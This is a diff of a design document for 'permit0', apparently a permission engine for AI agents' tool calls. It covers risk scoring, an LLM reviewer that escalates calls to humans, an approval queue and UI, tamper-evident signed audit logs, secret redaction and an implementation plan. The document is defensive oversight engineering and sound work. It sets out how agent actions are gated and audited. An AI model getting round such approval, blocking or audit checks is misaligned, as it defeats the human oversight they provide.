-fields  = {**norm["entities"], "org_domain": "myorg.com", "environment": "production",
-           "attachments": [{"name": "q3_forecast.xlsx", "classification": "internal"}]}
-rs      = assess("email.send", fields, session=session)
-# rs.tier = MEDIUM, rs.score = 43
+The `should_auto_approve()` check requires:
+- At least 100 human-approved examples for this `action_type`
+- Override rate < 5%
+- No recent security incidents involving this action type
 
-# Step 2: handle_medium invokes the agent reviewer
-permission, token = handle_medium(
-    tool_call={"tool": "bash", "arguments": {"command": "..."}},
-    norm_action=norm,
-    risk_score=rs,
-    task_goal="Prepare and send the Q3 financial summary to the CFO.",
-    session=session,
-    db=db,
-)
+### ML Approaches
 
-# Reviewer sees: task goal mentions CFO, recipient is CFO, attachment is internal.
-# Consistent with task -- no grounded reason to deny.
-# -> verdict: HUMAN (plausible, confidence 0.72, let human confirm)
+| Approach | Use case | Notes |
+|---|---|---|
+| Rule-based only | Bootstrap / low-data environment | Fully deterministic, auditable |
+| XGBoost / gradient boost | Tabular features from risk scores | Interpretable, low data requirement |
+| Transformer + classifier | Feature extraction from norm_action | Moderate data requirement |
+| LLM classifier | Unknown action types, free-text policies | Non-deterministic, use as fallback only |
 
-print(permission)      # human_in_the_loop
-print(token)           # None -- reviewer never issues tokens
+Start with rule-based only. Add ML as a **complement**, not a replacement. The rule-based scorer always runs; ML can suggest overrides with confidence scores.
+
+---
+
+## 15. Audit & Compliance
+
+### Audit Entry
+
+Every decision is logged as an immutable audit entry with cryptographic integrity.
+
+```rust
+pub struct AuditEntry {
+    // ── Identity ─────────────────────────────────────────
+    pub entry_id:        Ulid,
+    pub timestamp:       DateTime<Utc>,
+    pub sequence:        u64,              // monotonic, gaps = tampering evidence
+
+    // ── Decision ─────────────────────────────────────────
+    pub decision:        Permission,
+    pub decision_source: DecisionSource,   // scorer | allowlist | denylist
+                                           //   | policy_cache | agent_reviewer
+                                           //   | human_review | bootstrap
+
+    // ── What was decided ─────────────────────────────────
+    pub norm_action:     NormAction,
+    pub norm_hash:       NormHash,
+    pub raw_tool_call:   Value,            // redacted
+
+    // ── How it was scored ────────────────────────────────
+    pub risk_score:      Option<RiskScore>,
+    pub scoring_detail:  Option<ScoringDetail>,  // full breakdown, reproducible
+
+    // ── Who / where / why ────────────────────────────────
+    pub agent_id:        String,
+    pub session_id:      Option<String>,
+    pub task_goal:       Option<String>,
+    pub org_id:          String,
+    pub environment:     String,
+
+    // ── Provenance ───────────────────────────────────────
+    pub engine_version:  String,
+    pub pack_id:         String,           // "stripe.charges.create@2024-11-20"
+    pub pack_version:    String,
+    pub dsl_version:     String,
+
+    // ── Human review chain ───────────────────────────────
+    pub human_review:    Option<HumanReview>,
+
+    // ── Token ────────────────────────────────────────────
+    pub token_id:        Option<String>,
+
+    // ── Integrity ────────────────────────────────────────
+    pub prev_hash:       String,           // SHA-256 of previous entry (hash chain)
+    pub entry_hash:      String,
+    pub signature:       String,           // ed25519 over entry_hash
+
+    // ── Corrections ──────────────────────────────────────
+    pub correction_of:   Option<Ulid>,     // if overriding a prior decision
+}
+
+pub struct ScoringDetail {
+    pub active_flags:       Vec<String>,
+    pub amplifiers_raw:     HashMap<String, i32>,
+    pub amplifiers_norm:    HashMap<String, f64>,
+    pub category_scores:    HashMap<String, f64>,
+    pub base:               f64,
+    pub compound:           f64,
+    pub add_boost:          f64,
+    pub intermediate:       f64,
+    pub raw_score:          f64,
+    pub tier:               Tier,
+    pub block_rules_fired:  Vec<String>,
+}
+```
+
+`ScoringDetail` makes every decision **independently reproducible** — an auditor can verify the score from one entry without access to the running engine.
+
+### Redaction
+
+Raw tool calls may contain secrets, PII, or PHI. A configurable `Redactor` runs before the entry is signed.
+
+Built-in patterns redact: `password`, `secret`, `token`, `api_key`, `authorization`, `credential`, `ssn`, `dob`, `mrn`, and value patterns like `Bearer ...`, `sk_live_...`, `ghp_...`.
+
+Hosts can add domain-specific patterns (e.g., `body.patient_id` for HIPAA).
+
+### Audit Sink
+
+```rust
+pub trait AuditSink: Send + Sync {
+    fn append(&self, entry: &AuditEntry) -> Result<(), AuditError>;
+    fn append_batch(&self, entries: &[AuditEntry]) -> Result<(), AuditError>;
+    fn query(&self, filter: &AuditFilter) -> Result<AuditCursor, AuditError>;
+    fn verify_chain(&self, from: u64, to: u64) -> Result<ChainVerification, AuditError>;
+}
+```
+
+Built-in implementations: `SqliteAuditSink`, `PostgresAuditSink`, `S3AuditSink` (WORM), `StdoutAuditSink` (pipe to SIEM).
+
+### Audit Policy
+
+- **`strict`** — if any sink fails, the decision is not returned. The agent is blocked until audit infrastructure recovers. **Required for fintech.**
+- **`best_effort`** — log failure, continue, buffer and retry.
+
+### Export Formats
+
+| Format | Use case | Command |
+|---|---|---|
+| CSV | Compliance analysts, SOC 2 audits | `permit0 audit export --format csv` |
+| JSONL | SIEM ingestion (Splunk, Datadog, Elastic) | `permit0 audit export --format jsonl` |
+| Signed bundle | Legal/regulatory evidence | `permit0 audit export --format signed-bundle` |
+
+The signed bundle is a self-contained archive verifiable on an air-gapped machine:
+
+```
+acme-2025-audit.permit0/
+├── manifest.json
+├── entries.jsonl
+├── chain.json
+├── engine-pubkey.pem
+├── export-signature.sig
+└── README.txt
+```
+
+```bash
+permit0 audit verify acme-2025-audit.permit0
+# Chain integrity: OK
+# Signature: VALID
+# Entry signatures: 142,387 / 142,387 valid
+```
+
+### Retention
+
+| Regime | Minimum retention |
+|---|---|
+| SOC 2 | 12 months queryable |
+| PCI-DSS | 12 months online + 12 months archive |
+| HIPAA | 6 years |
+| SOX | 7 years |
+| FDA SaMD | Life of device + 2 years |
+
+### GDPR Compatibility
+
+Audit entries use pseudonymized actor references. GDPR deletion removes the identity mapping, not the audit entry:
+
+```rust
+pub struct ActorRef {
+    pub pseudonym:      String,    // "actor:a3f91b2c"
+    pub identity_store: String,    // "acme-identity-db"
+}
+```
+
+### Approval UI
+
+A web-based dashboard embedded in the permit0 binary for audit log viewing and human approval workflows.
+
+#### Architecture
+
+```
+permit0 ui serve --port 8080 --token "sk-xxx"
+
+┌──────────────────────────────────────────────────────┐
+│  permit0 binary                                      │
+│                                                      │
+│  ┌──────────────┐    ┌───────────────────────────┐   │
+│  │ axum server   │───│ Static assets (SPA)        │   │
+│  │               │   │ React + TailwindCSS        │   │
+│  │ /api/v1/*     │   │ bundled at compile time    │   │
+│  │ /ws           │   └───────────────────────────┘   │
+│  └──────┬───────┘                                    │
+│         │                                            │
+│  ┌──────┴───────┐    ┌───────────────────────────┐   │
+│  │ Engine        │───│ Store (SQLite / Postgres)  │   │
+│  └──────────────┘    └───────────────────────────┘   │
+└──────────────────────────────────────────────────────┘
+```
+
+- **Backend:** axum (Rust) — REST API + WebSocket endpoint
+- **Frontend:** React + TailwindCSS, compiled to static assets and embedded in the binary via `rust-embed`
+- **Real-time:** WebSocket push for pending approvals and live log streaming
+- **Deployment:** single binary, `permit0 ui serve`
+
+#### Authentication
+
+Two modes, selected by configuration:
+
+**Phase 14a — Local Token (individual / dev use)**
+
+```yaml
+# config/ui.yaml
+auth:
+  mode: token
+  tokens:
+    - id: admin-1
+      secret_hash: "sha256:..."    # permit0 ui token create --role admin
+      role: admin
+      name: "Alice"
+    - id: viewer-1
+      secret_hash: "sha256:..."
+      role: viewer
+      name: "Bob"
+```
+
+```bash
+# Generate a token
+permit0 ui token create --role admin --name "Alice"
+# → Token: sk-p0-xxxxxxxxxxxx (shown once)
+
+# Start the UI
+permit0 ui serve --port 8080
+```
+
+Users authenticate with `Authorization: Bearer sk-p0-xxx` or enter the token in the login page.
+
+**Phase 14b — OIDC (enterprise / production)**
+
+```yaml
+auth:
+  mode: oidc
+  issuer: https://login.acme.com
+  client_id: permit0-ui
+  client_secret_env: PERMIT0_OIDC_SECRET
+  allowed_domains: ["acme.com"]
+  role_mapping:
+    admin:   ["security-team@acme.com"]
+    approver: ["engineering-leads@acme.com"]
+    viewer:   ["*@acme.com"]
+```
+
+- Users log in via their existing identity provider (Okta, Azure AD, Google Workspace, etc.)
+- permit0 verifies the OIDC token, maps claims to roles
+- No passwords stored in permit0
+
+**Roles:**
+
+| Role | Audit log | Approve/Deny | Allowlist/Denylist | Calibration |
+|---|---|---|---|---|
+| `viewer` | Read | — | — | — |
+| `approver` | Read | Yes | — | — |
+| `admin` | Read | Yes | Manage | Review |
+
+#### Pages
+
+**1. Audit Log**
+
+Full-text search and structured filtering over all `AuditEntry` records.
+
+| Filter | Type | Example |
+|---|---|---|
+| Time range | date picker | Last 24h, last 7d, custom |
+| Action type | dropdown | `payments.charge`, `email.send` |
+| Tier | multi-select | MEDIUM, HIGH, CRITICAL |
+| Decision | multi-select | Allow, Human, Deny |
+| Decision source | multi-select | scorer, human_review, allowlist |
+| Agent ID | text | `agent-42` |
+| Session ID | text | `sess-abc` |
+| Pack | dropdown | `stripe`, `gmail` |
+
+Each row expands to show:
+- Full `NormAction` with entities
+- `ScoringDetail` breakdown (flags, amplifiers, category scores)
+- Session context at time of decision
+- Human review chain (if any)
+- Token ID and expiry (if issued)
+
+**2. Approval Queue**
+
+Live queue of pending HUMAN-routed decisions, pushed via WebSocket.
+
+```
+┌─────────────────────────────────────────────────────────┐
+│  Pending Approvals (3)                          🔴 Live │
+├─────────────────────────────────────────────────────────┤
+│                                                         │
+│  ┌─────────────────────────────────────────────────┐    │
+│  │ 🟡 payments.charge  ·  score: 48  ·  MEDIUM    │    │
+│  │ Agent: agent-7  ·  Session: task-42             │    │
+│  │ Stripe charge $500 to external account          │    │
+│  │ Waiting: 12s                                    │    │
+│  │                                                 │    │
+│  │  [Approve]  [Deny]  [Details ▾]                 │    │
+│  └─────────────────────────────────────────────────┘    │
+│                                                         │
+│  ┌─────────────────────────────────────────────────┐    │
+│  │ 🟡 email.send  ·  score: 42  ·  MEDIUM         │    │
+│  │ Agent: agent-3  ·  Session: task-15             │    │
+│  │ Send email to external recipient (3 attachments)│    │
+│  │ Waiting: 45s                                    │    │
+│  │                                                 │    │
+│  │  [Approve]  [Deny]  [Details ▾]                 │    │
+│  └─────────────────────────────────────────────────┘    │
+│                                                         │
+└─────────────────────────────────────────────────────────┘
+```
+
+Details panel shows:
+- Raw tool call (redacted)
+- Full risk score breakdown with visual bars for each amplifier
+- Session history timeline
+- Agent reviewer's reasoning (if reviewer ran)
+- Similar past decisions (nearest-neighbor matches)
+
+Approve/Deny actions:
+- Require a reason (free text, optional for Approve, required for Deny)
+- Record the reviewer identity and timestamp
+- Push the decision back to the waiting agent via WebSocket
+- Create an `AuditEntry` with `decision_source: human_review`
+
+**3. Lists Management**
+
+View and manage allowlist / denylist entries:
+- Search by `norm_hash`, action type, or reason
+- Add new entries (with required justification and expiry for allowlist)
+- Remove entries
+- See which entries are about to expire
+
+**4. Dashboard**
+
+Overview metrics:
+- Decision distribution (Allow / Human / Deny) over time
+- Tier distribution
+- Human override rate
+- Average approval latency
+- Top action types by volume
+- Active sessions
+
+#### API Endpoints
+
+```
+GET    /api/v1/audit              # list audit entries (paginated, filtered)
+GET    /api/v1/audit/:id          # single audit entry with full detail
+GET    /api/v1/audit/stats        # aggregate statistics
+
+GET    /api/v1/approvals          # list pending approvals
+POST   /api/v1/approvals/:id      # submit decision { action: approve|deny, reason }
+WS     /ws                        # WebSocket: new approvals, live log stream
+
+GET    /api/v1/lists/allow        # allowlist entries
+POST   /api/v1/lists/allow        # add allowlist entry
+DELETE /api/v1/lists/allow/:hash  # remove allowlist entry
+GET    /api/v1/lists/deny         # denylist entries
+POST   /api/v1/lists/deny         # add denylist entry
+DELETE /api/v1/lists/deny/:hash   # remove denylist entry
+
+GET    /api/v1/sessions           # active sessions
+GET    /api/v1/sessions/:id       # session detail with timeline
+```
+
+#### WebSocket Protocol
+
+```jsonc
+// Server → Client: new approval pending
+{ "type": "approval_pending", "id": "apr-123", "norm_action": {...}, "risk_score": {...}, "waiting_since": "..." }
+
+// Server → Client: approval resolved (by another reviewer)
+{ "type": "approval_resolved", "id": "apr-123", "decision": "allow", "by": "alice" }
+
+// Server → Client: live audit entry
+{ "type": "audit_entry", "entry": {...} }
+
+// Client → Server: subscribe to channels
+{ "type": "subscribe", "channels": ["approvals", "audit"] }
+```
+
+#### Agent-Side Blocking
+
+When the engine routes a decision to HUMAN, the agent is blocked until a human responds:
+
+```rust
+pub struct PendingApproval {
+    pub id:           String,
+    pub norm_action:  NormAction,
+    pub risk_score:   RiskScore,
+    pub session:      Option<SessionContext>,
+    pub created_at:   DateTime<Utc>,
+    pub timeout:      Duration,           // default: 5 min
+    pub notify:       oneshot::Sender<HumanDecision>,
+}
+```
+
+- `get_permission()` creates a `PendingApproval`, pushes it to the UI via WebSocket, and `await`s the `oneshot::Receiver`.
+- The approval times out after a configurable duration (default 5 min) → treated as Deny.
+- If the UI is not connected, the engine falls back to CLI prompt or auto-deny (configurable).
+
+#### Notification Channels (Future)
+
+Beyond the WebSocket UI, approvers may need notifications when they're not watching the dashboard:
+
+| Channel | Priority | Phase |
+|---|---|---|
+| WebSocket (UI) | Primary | 14a |
+| Email | For SLA-bound approvals | 15+ |
+| Slack / webhook | For team workflows | 15+ |
+| Mobile push | For on-call approvers | 15+ |
+
+#### CLI Fallback
+
+For headless environments or when the UI is not running:
+
+```bash
+# Interactive approval mode
+permit0 ui approve --interactive
+# → Shows pending approvals in terminal, arrow keys to select, enter to approve/deny
+
+# Single approval
+permit0 ui approve apr-123 --action approve --reason "Verified with CFO"
+```
+
+### CLI Commands
+
+```bash
+# Export
+permit0 audit export --format csv|jsonl|signed-bundle [filters] -o file
+
+# Verify
+permit0 audit verify <bundle.permit0>
+permit0 audit verify --store postgres --range 2025-01-01..2025-12-31
+
+# Query
+permit0 audit query --action-type payments.charge --last 24h
+permit0 audit query --decision deny --tier-min HIGH --last 7d
+permit0 audit query --session sess-42
+
+# Stats
+permit0 audit stats --last 30d
+permit0 audit stats --by-domain --last 30d
+permit0 audit stats --overrides --last 90d
+
+# Lifecycle
+permit0 audit archive --older-than 365d --to s3://permit0-archive/
+permit0 audit gdpr-forget --actor-ref actor:a3f91b2c
 ```
 
 ---
 
-## 13. Developing
+## 16. Developing
 
-### Language strategy
+### Rust Core API
 
-permit0 uses three languages with clearly separated responsibilities:
-
-| Layer | Language | Responsibility |
-|---|---|---|
-| Core engine | Rust | Risk scoring, token issuance/verification, session state, crypto |
-| Rules & config | Python | Action definitions, mutation rules, amplifier weights, block rules |
-| Integrations | TypeScript | SDK for agent frameworks, browser tooling, API client |
-
-The core is Rust for two reasons: the scoring pipeline runs on every tool call in the hot path (latency matters), and the token crypto must be correct by construction (safety matters). Python and TypeScript never touch cryptographic primitives -- they call into the Rust core via FFI or a local socket.
-
-### Rust core
-
-The Rust crate exposes a narrow public API. Everything else is internal.
+The engine exposes a narrow public API:
 
 ```rust
-// Core public API surface
+pub struct Engine { /* private */ }
 
-pub struct RiskEngine {
-    weights:       RiskWeights,
-    block_rules:   Vec<BlockRule>,
-    session_store: SessionStore,
-}
+impl Engine {
+    pub fn builder() -> EngineBuilder;
 
-impl RiskEngine {
-    /// Load weights and rules from a compiled rule bundle.
-    pub fn from_bundle(bundle: &RuleBundle) -> Result<Self, EngineError>;
-
-    /// Score a normalized action, optionally against a session.
-    pub fn assess(
+    pub fn get_permission(
         &self,
-        action_type: &str,
-        entities:    &EntityMap,
-        session_id:  Option<&str>,
-    ) -> Result<RiskScore, EngineError>;
+        tool_call: &RawToolCall,
+        ctx: &PermissionCtx,
+    ) -> Result<(Permission, Option<CapabilityToken>), EngineError>;
 
-    /// Issue a Biscuit token after approval.
-    pub fn issue_token(
-        &self,
-        score:      &RiskScore,
-        norm:       &NormalizedAction,
-        session_id: &str,
-        authority:  IssuingAuthority,
-        keypair:    &KeyPair,
-    ) -> Result<BiscuitToken, TokenError>;
-
-    /// Verify a Biscuit token against actual call entities.
     pub fn verify_token(
         &self,
-        token:    &BiscuitToken,
-        entities: &EntityMap,
-        root_key: &PublicKey,
+        token: &BiscuitToken,
+        entities: &Entities,
     ) -> Result<VerificationResult, TokenError>;
 }
+
+pub struct EngineBuilder { /* private */ }
+
+impl EngineBuilder {
+    pub fn with_base_config(self, config: BaseConfig) -> Self;
+    pub fn with_profile(self, profile: Profile) -> Self;
+    pub fn with_org_policy(self, policy: OrgPolicy) -> Self;
+    pub fn with_store(self, store: impl Store + 'static) -> Self;
+    pub fn with_audit_sinks(self, sinks: Vec<Arc<dyn AuditSink>>) -> Self;
+    pub fn with_redactor(self, redactor: impl Redactor + 'static) -> Self;
+    pub fn with_signing_key(self, key: SigningKey) -> Self;
+    pub fn with_llm_client(self, client: impl LlmClient + 'static) -> Self;
+    pub fn install_pack(self, pack_path: &Path) -> Self;  // load YAML pack
+    pub fn install_native(self, install_fn: fn(&mut Self)) -> Self;  // Rust pack
+    pub fn build(self) -> Result<Engine, BuildError>;
+}
+
+// Usage:
+let engine = Engine::builder()
+    .with_base_config(BaseConfig::default())
+    .with_profile(Profile::load("fintech")?)
+    .with_org_policy(OrgPolicy::load("./org-policy.yaml")?)
+    .with_store(SqliteStore::open("permit0.db")?)
+    .with_audit_sinks(vec![
+        Arc::new(PostgresAuditSink::new(pg_pool)),
+        Arc::new(S3AuditSink::new(s3_client, "permit0-audit")),
+    ])
+    .with_signing_key(SigningKey::from_env("PERMIT0_AUDIT_KEY")?)
+    .install_pack(Path::new("packs/stripe/"))
+    .install_pack(Path::new("packs/gmail/"))
+    .install_native(permit0_pack_bash::install)  // always last — fallback
+    .build()?;
 ```
 
-Key Rust crates:
+### Key Rust Crates
 
 | Crate | Purpose |
 |---|---|
-| `biscuit-auth` | Biscuit token issuance, attenuation, and verification |
-| `serde` / `serde_json` | Serialization of entities and rule bundles |
-| `tokio` | Async runtime for the session store and socket server |
-| `dashmap` | Concurrent in-memory session state |
-| `tracing` | Structured logging for every scoring decision |
+| `biscuit-auth` | Token issuance, attenuation, verification |
+| `serde` / `serde_json` | Serialization |
+| `serde_yaml` | DSL parsing |
+| `sha2` | norm_hash, hash chain |
+| `ed25519-dalek` | Audit entry signatures |
+| `rusqlite` | Default store |
+| `ulid` | Entry IDs |
+| `regex` | Pattern matching in DSL (linear time, no backtracking) |
+| `tracing` | Structured logging |
 
-### Python wrapper
-
-The Python package wraps the Rust core via `PyO3`. It provides the action registry, mutation rules, and the `assess()` / `issue_token()` / `verify_token()` entry points described throughout this document.
-
-```
-permit0/
-  __init__.py
-  engine.py          # PyO3 bindings to Rust core
-  registry.py        # ACTION_REGISTRY + @register decorator
-  actions/
-    email.py         # EmailSend, EmailForward
-    process.py       # ProcessShell
-    files.py         # FilesWrite
-    network.py       # NetworkHttpPost
-    db.py            # DbDelete
-    payments.py      # PaymentsCharge
-    iam.py           # IamAssignRole
-    secrets.py       # SecretsRead
-  session.py         # SessionContext, ActionRecord
-  token.py           # CapabilityToken, issue_token, verify_token
-  weights.py         # RISK_WEIGHTS, AMP_WEIGHTS, TIER_THRESHOLDS
-  block_rules.py     # BLOCK_RULES, SESSION_BLOCK_RULES
-```
-
-The Python layer is the authoring surface for rules. When a new action type is added, a developer writes a Python class with `base()` and `mutate()`, decorates it with `@register`, and the rule compiler serialises it into a binary bundle that the Rust core loads at startup. Rule updates do not require recompiling Rust.
+### Python Bindings (PyO3)
 
 ```python
-# Compiling Python rules into a Rust-loadable bundle
-from permit0.compiler import RuleCompiler
+from permit0 import Engine, Permission
 
-compiler = RuleCompiler()
-bundle   = compiler.compile(ACTION_REGISTRY, BLOCK_RULES, AMP_WEIGHTS)
-bundle.write("/etc/permit0/rules.bundle")
-# Rust engine loads this at startup, or hot-reloads on SIGHUP
+engine = Engine.from_config(
+    profile="fintech",
+    org_policy="./org-policy.yaml",
+    packs=["packs/stripe/", "packs/gmail/"],
+    store="sqlite:///permit0.db",
+)
+
+permission, token = engine.get_permission(
+    tool_call={"tool": "http", "arguments": {...}},
+    session_id="task-42",
+    org_domain="myorg.com",
+    environment="production",
+    task_goal="Send Q3 report to CFO",
+)
+
+if permission == Permission.DENY:
+    raise PermissionError("Blocked by permit0")
+if permission == Permission.HUMAN_IN_THE_LOOP:
+    # surface to human reviewer
+    ...
 ```
 
-### TypeScript SDK
+Distributed via `maturin` → `pip install permit0`. Prebuilt wheels for Linux/macOS/Windows. No Rust toolchain required for users.
 
-The TypeScript package is a thin client -- it contains no scoring logic. It serialises tool calls, sends them to the permit0 server (running the Rust core), and returns the permission and token. This is the integration point for JavaScript/TypeScript agent frameworks.
+### TypeScript Bindings (napi-rs)
 
 ```typescript
-import { Permit0Client } from "@permit0/sdk";
+import { Engine, Permission } from '@permit0/core';
 
-const client = new Permit0Client({
-  endpoint:  "http://localhost:7743",
-  orgDomain: "myorg.com",
+const engine = Engine.fromConfig({
+  profile: 'fintech',
+  orgPolicy: './org-policy.yaml',
+  packs: ['packs/stripe/', 'packs/gmail/'],
+  store: 'sqlite:///permit0.db',
 });
 
-// Intercept a tool call before execution
-const { permission, token } = await client.assess({
-  toolCall:    { tool: "bash", arguments: { command: "..." } },
-  sessionId:   "task-42",
-  environment: "production",
+const { permission, token } = engine.getPermission({
+  toolCall: { tool: 'http', arguments: { ... } },
+  sessionId: 'task-42',
+  orgDomain: 'myorg.com',
+  environment: 'production',
+  taskGoal: 'Send Q3 report to CFO',
 });
 
-if (permission === "deny") {
-  throw new Error(`Blocked: ${token?.blockReason}`);
+if (permission === Permission.Deny) {
+  throw new Error('Blocked by permit0');
 }
-
-if (permission === "human_in_the_loop") {
-  await client.awaitHumanApproval(token!.nonce);
-}
-
-// Token is valid -- execute the tool call
-await executeTool(toolCall, token!);
-```
-
-The SDK also exposes `verify()` for executors that receive a token from an upstream agent and need to check it locally before running.
-
-```typescript
-const result = await client.verify({
-  token:    receivedToken,
-  entities: actualCallEntities,
-});
-
-if (!result.valid) {
-  throw new Error(`Token verification failed: ${result.reason}`);
+if (permission === Permission.HumanInTheLoop) {
+  // surface to human reviewer
 }
 ```
 
-### Development workflow
+Distributed via `@napi-rs/cli` → prebuilt binaries per platform. `npm install @permit0/core`.
+
+### External Normalizer Bridge
+
+For proprietary internal tools that can't be upstreamed, hosts can register normalizers from Python or TypeScript at runtime:
+
+```python
+from permit0 import Engine, NormAction
+
+@engine.register_normalizer(id="acme.crm.update", priority=80)
+def normalize_acme_crm(raw_tool_call, ctx):
+    if raw_tool_call["tool"] != "acme-crm":
+        return None
+    return NormAction(
+        action_type="crm.update_contact",
+        domain="crm",
+        verb="update_contact",
+        channel="acme-crm",
+        entities={...},
+    )
+```
+
+Rules:
+
+- Bridges only for normalizers, never risk rules. Scoring stays 100% in Rust.
+- Logged as `source=external_normalizer` in audit trail.
+- Cannot override built-in packs (priority capped below bundled packs).
+
+### CLI
+
+```bash
+# ── Engine ────────────────────────────────────────────────
+permit0 check < tool_call.json             # score a single tool call
+permit0 check --interactive                 # interactive REPL mode
+
+# ── Packs ─────────────────────────────────────────────────
+permit0 pack new stripe.charges.create      # scaffold a new normalizer
+permit0 pack test ./packs/stripe/           # run fixtures
+permit0 pack diff old.yaml new.yaml         # show norm_hash impact
+permit0 pack validate ./packs/stripe/       # static check
+
+# ── Calibration ───────────────────────────────────────────
+permit0 calibrate diff --profile fintech
+permit0 calibrate simulate --profile fintech --input '...'
+permit0 calibrate test --corpus corpora/calibration/
+permit0 calibrate validate --profile fintech --org-policy ./config.yaml
+
+# ── Audit ─────────────────────────────────────────────────
+permit0 audit export --format csv|jsonl|signed-bundle [filters] -o file
+permit0 audit verify <bundle.permit0>
+permit0 audit query [filters]
+permit0 audit stats --last 30d
+
+# ── Cache ─────────────────────────────────────────────────
+permit0 cache invalidate --norm-hash <hash>
+permit0 cache clear
+
+# ── Catalog ───────────────────────────────────────────────
+permit0 catalog list                        # show all action types
+permit0 catalog validate                    # check all packs reference valid types
+permit0 catalog deprecations                # list pending deprecations
+```
+
+### Development Workflow
 
 ```
-1. Write or update a Python action class (base + mutate)
-2. Run unit tests:        pytest tests/actions/
-3. Compile rule bundle:   python -m permit0.compiler --output rules.bundle
-4. Run integration tests: cargo test   (loads the compiled bundle)
-5. Run calibration:       python -m permit0.calibrate --cases tests/calibration/
-6. Deploy rules:          copy rules.bundle to server, send SIGHUP for hot reload
+1. Write or update a YAML pack (normalizer + risk rules + fixtures)
+2. Run pack tests:         permit0 pack test ./packs/stripe/
+3. Run calibration:        permit0 calibrate test --corpus corpora/calibration/
+4. Run unit tests:         cargo nextest run
+5. Run integration tests:  cargo nextest run --profile integration
+6. Submit PR — CI runs:    pack tests, calibration, cargo test, cargo deny, cargo audit
+7. Deploy: copy pack YAML to deployment, engine hot-reloads packs on SIGHUP
 ```
 
-Rules can be updated and hot-reloaded without restarting the Rust process. Only changes to the Rust core -- scoring algorithm, crypto, session store -- require a binary release.
+YAML packs can be updated and hot-reloaded without restarting the engine process. Only changes to the Rust core (scoring algorithm, crypto, session logic) require a binary release.
+
+---
+
+## 17. Phased Implementation Plan
+
+Each phase produces something runnable end-to-end before adding sophistication. Phases are grouped into three milestones:
+
+- **Milestone A (Phases 0–3):** Core engine — score a tool call, get a decision. Useful standalone.
+- **Milestone B (Phases 4–9):** Production-ready — persistence, tokens, session awareness, CLI tooling.
+- **Milestone C (Phases 10–16):** Enterprise — agent reviewer, audit compliance, UI, OIDC, community.
+
+---
+
+### Phase 0 — Project Skeleton
+
+**Goal:** Empty workspace that builds and passes CI on all platforms.
+
+**Crates created:**
+```
+permit0-core/
+├── Cargo.toml                     # workspace root
+├── Cargo.lock                     # committed for reproducibility
+├── crates/
+│   ├── permit0-types/             # shared types (Tier, Permission, NormAction, etc.)
+│   ├── permit0-scoring/           # risk scoring math
+│   ├── permit0-normalize/         # Normalizer trait, NormalizerRegistry
+│   ├── permit0-dsl/               # YAML DSL parser, interpreter, helpers
+│   ├── permit0-engine/            # orchestrator (get_permission)
+│   ├── permit0-token/             # Biscuit capability tokens
+│   ├── permit0-session/           # SessionContext, session aggregation
+│   ├── permit0-store/             # Store trait, SQLite/Postgres impl
+│   ├── permit0-agent/             # LLM reviewer (agent-in-the-loop)
+│   ├── permit0-ui/                # axum API + embedded React SPA
+│   ├── permit0-cli/               # CLI binary
+│   ├── permit0-py/                # Python bindings (PyO3)
+│   └── permit0-node/              # TypeScript bindings (napi-rs)
+├── packs/                         # first-party YAML packs
+│   ├── bash/
+│   ├── gmail/
+│   └── stripe/
+├── profiles/                      # domain calibration profiles
+│   ├── fintech.profile.yaml
+│   └── healthtech.profile.yaml
+├── corpora/                       # calibration test corpus
+│   └── calibration/
+└── docs/
+    ├── permit.md
+    └── dsl.md
+```
+
+**Tasks:**
+1. Initialize Cargo workspace with all crate stubs (empty `lib.rs` with `#![forbid(unsafe_code)]`)
+2. CI pipeline: GitHub Actions matrix (Linux/macOS/Windows, stable Rust)
+3. CI checks: `cargo build --workspace`, `cargo nextest run`, `cargo clippy`, `cargo fmt --check`, `cargo deny check`, `cargo audit`
+4. `.gitignore`, `rustfmt.toml`, `clippy.toml`, `deny.toml`
+5. `LICENSE` (Apache-2.0), basic `README.md`
+
+**Exit criteria:**
+- `cargo build --workspace` succeeds
+- CI green on all 3 platforms
+- `cargo deny check` and `cargo audit` pass with zero findings
+
+**Dependencies:** None.
+
+---
+
+### Phase 1 — Core Types & Scoring Math
+
+**Goal:** Deterministic risk scorer that takes a `RiskTemplate` and returns a `RiskScore`.
+
+**Crates:** `permit0-types`, `permit0-scoring`
+
+**permit0-types:**
+1. `Tier` enum: `Minimal`, `Low`, `Medium`, `High`, `Critical` with `Ord` derivation
+2. `Permission` enum: `Allow`, `HumanInTheLoop`, `Deny`
+3. `RiskFlag` enum: 9 flags (`Outbound`, `Exposure`, `Mutation`, `Destruction`, `Financial`, `Privilege`, `Execution`, `Physical`, `Governance`)
+4. `FlagRole` enum: `Primary`, `Secondary`
+5. `AmplifierDim` enum: 10 dimensions
+6. `RiskScore` struct: `raw: f64`, `score: u32`, `tier: Tier`, `flags: Vec<(RiskFlag, FlagRole)>`, `blocked: bool`, `block_reason: Option<String>`, `reasons: Vec<String>`
+7. `NormAction` struct with `norm_hash()` → SHA-256 of canonical JSON
+8. `RawToolCall` struct
+9. `Entities` type alias (`HashMap<String, Value>`)
+
+**permit0-scoring:**
+1. Constants: `RISK_WEIGHTS`, `AMP_WEIGHTS`, `AMP_MAXES`, `TIER_THRESHOLDS`, `CATEGORIES`
+2. `RiskTemplate` struct with mutation methods:
+   - `add_flag()`, `remove_flag()`, `promote_flag()`
+   - `upgrade()`, `downgrade()`, `override_amp()`
+3. `normalise_amps()` — raw amplifiers → normalized 0.0–1.0
+4. `compute_hybrid()` — the 6-step scoring pipeline:
+   - Step 1: Data category base score from active flags
+   - Step 2: Block rules check (returns early if gate fires)
+   - Step 3: Compound multiplier from amplifier dimensions
+   - Step 4: Additive boost from high-weight amplifiers
+   - Step 5: Tanh squeeze to 0.0–1.0
+   - Step 6: Tier mapping via thresholds
+5. Split resolution: independent sub-template scoring, `score = max(parent, child)`
+6. `ScoringConfig` struct with weight/threshold overrides
+7. `Guardrails` struct with `check_guardrails()` validation
+8. `ScoringConfig::from_layers()` — compose base + profile + org policy
+
+**Tests:**
+- Property tests: tier monotonicity (higher amplifiers → higher or equal tier)
+- Property tests: block-rule precedence (gate always → CRITICAL)
+- Property tests: splits = max(parent, child)
+- Unit tests: `compute_hybrid` with known inputs → known outputs
+- Unit tests: guardrail violations → hard error
+- Golden test: §9 worked example amplifiers → expected score
+
+**Exit criteria:**
+- `RiskTemplate` → `compute_hybrid()` → `RiskScore` pipeline works
+- All property tests pass
+- Guardrails reject invalid configurations
+
+**Dependencies:** Phase 0.
+
+---
+
+### Phase 2 — Normalization & Registry
+
+**Goal:** `Normalizer` trait and `NormalizerRegistry` that dispatches raw tool calls to the right normalizer.
+
